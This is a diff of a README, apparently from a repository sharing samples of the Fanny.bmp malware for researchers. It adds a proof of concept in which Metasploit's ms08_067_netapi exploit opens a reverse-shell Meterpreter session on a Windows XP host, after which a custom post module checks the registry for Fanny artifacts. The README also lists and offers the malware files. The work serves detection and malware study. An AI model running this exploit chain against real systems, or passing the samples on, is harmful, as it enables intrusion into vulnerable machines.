@@ -6,14 +6,12 @@
 
 -------------
 
-
 ### POC
 Screenshot: https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-11eb-8495-7180a52c7266.png
-   
+
 -------------
 
 All these I thought of earlier providing, since I was one of the people that got this on my USB stick (my USB got infected long long time ago, Years ago now.) - But now - when I looked closer and I saw that some of these isn't even available online (Some of them are, still - like fanny.bmp and maybe some others, and ECELP4.acm) but not any of mscorwin / comhost, etc. (If they are - I would love to hear that! and the source of it. The more sources of same malware - the better. It strengthens the "community" if I can put it that way. And it is easier to find if all material is gathered at one place.
-
 But I thought of providing all of these to malware researchers. As well as for academical purposes.
 
 -------------
@@ -37,62 +35,48 @@ And (for "optional" reading) I would suggest this one:
 "AiR-ViBeR: Exfiltrating Data from Air-GappedComputers via Covert Surface ViBrAtIoNs." - writeup about Stuxnet,Fanny, Agent.btz (which is really like each others in ways) 
 
 
-#### I have provided 1 more (fanny) way, to detect (fanny) by using MetaSploit. (Part of the *fanny* phun!)
-Located in this Git, here:
-    -  https://github.com/loneicewolf/fanny.bmp/blob/main/Detection/By-Application/MetaSploit/FannyDetect.txt
-    
--------------
-    
-    (short dump of the file)
-    
-* ---------------------------------------------------------------------------------------------------------------------------- *
-
-            [+] 84.xxx.x5.31:445   - Command completed successfully!
-            [*] 84.xxx.x5.31:445   - Output for "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4":
-
-             - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4
-                 - filter8     REG_BINARY      6C7361737323433A5C57494E444F57535C73797374656D33325C6D73636F7277696E2E646C6C00
-                 - DevNode     REG_DWORD       0x0
-                 - Driver      REG_SZ          c:\WINDOWS\SYSTEM32\ECELP4.ACM
-                 - filter3     REG_BINARY      6578706C6F72657223633A5C77696E646F77735C73797374656D33325C7368656C6C646F632E646C6C00
-                 - filter2     REG_BINARY      77696E6C6F676F6E23633A5C77696E646F77735C4D534167656E745C4147454E544350442E444C4C00
-
-* ---------------------------------------------------------------------------------------------------------------------------- *
-
--------------
-
-## Maybe someone could create a Metasploit Module to detect Fanny based on the above?
-## - as with Duqu, there is this windows post/gather forensics dump that checks for duqu in the Registry,   
-
-     post/windows/gather/forensics/duqu_check   Windows Gather Forensics Duqu Registry Check
+### POC:
 
 
-#### why not make some for:
+First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
 
- - [x] done. Continuing below. Fanny (as I show in **https://github.com/loneicewolf/fanny.bmp/blob/main/Detection/By-Application/MetaSploit/FannyDetect.txt** )
- - Flamer
- - EquationDrug
- - GROK
-                (And the many others in "the family")
+place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/
+
+* make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>
+
+Start msfconsole
+
+use exploit/windows/smb/ms08_067_netapi
+
+set RHOST and LHOST.
+
+    msf6 exploit(windows/smb/ms08_067_netapi) > run
+
+      [*] Started reverse TCP handler on 192.168.122.1:4444 
+      [*] 192.168.122.160:445 - Automatically detecting the target...
+      [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+      [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+      [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
+      [*] Sending stage (175174 bytes) to 192.168.122.160
+      [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100
+
+meterpreter > run post/windows/gather/forensics/fanny_bmp_check
+
+    [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
+    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
+    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
+    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
+    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
+    [*] WORKSTATION1: 4 result(s) found in registry.
 
 
 
 
--------------
 
-
-- https://www.wired.com/2015/02/nsa-firmware-hacking/
-
-
--------------
 
 
 ##  Fanny (and the other files, completely provided)
 ### includes:
-
-
--------------
-
 
 
 - 
@@ -141,19 +125,9 @@ Located in this Git, here:
     - dll_installer.dll [will provide soon]
 
 
--------------
-
-
 ### If you spot an mistake, please let me now.
 
-
--------------
-
-
-
-#### I am in kinda a hurry right now (Going 1 course and doing repetition on Cryptography) This is why I haven't really made this sorted & neat (yet) but will do later. 
-   
-
+------------
 
 Urgent Contacts: (Malware Researchers)
 Discord: Ken-Kaneki#3978
